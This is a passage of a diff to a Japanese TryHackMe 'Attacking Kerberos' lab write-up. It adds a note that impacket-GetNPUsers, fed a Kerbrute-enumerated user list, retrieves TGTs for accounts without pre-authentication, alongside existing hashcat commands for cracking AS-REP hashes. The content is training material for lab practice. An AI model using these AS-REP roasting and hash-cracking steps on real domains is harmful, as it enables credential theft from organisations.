@@ -197,3 +197,7 @@ What is the User's Password?
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_18.png" width="100%" height="100%">  
 「`scp SSHユーザ名@IPアドレス:/リモートパス ローカルパス`」でRubeus出力を取得し  
 「`hashcat -a 0 -m 18200 ハッシュファイル名 Wordlist名`」でハッシュをクラック。（`-m 18200`は`$krb5asrep`形式のHash形式、Johnでもサポートしている。）
+
+ちなみに「`impacket-GetNPUsers ドメイン名/ -no-pass -dc-ip IPアドレス -userfile ユーザリスト -outputfile 出力ファイル`」でも、事前認証無効ユーザのTGTを取得できた。  
+「`-userfile`」では、Kerbruteで列挙したユーザを使用した。
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_18.png" width="100%" height="100%">  
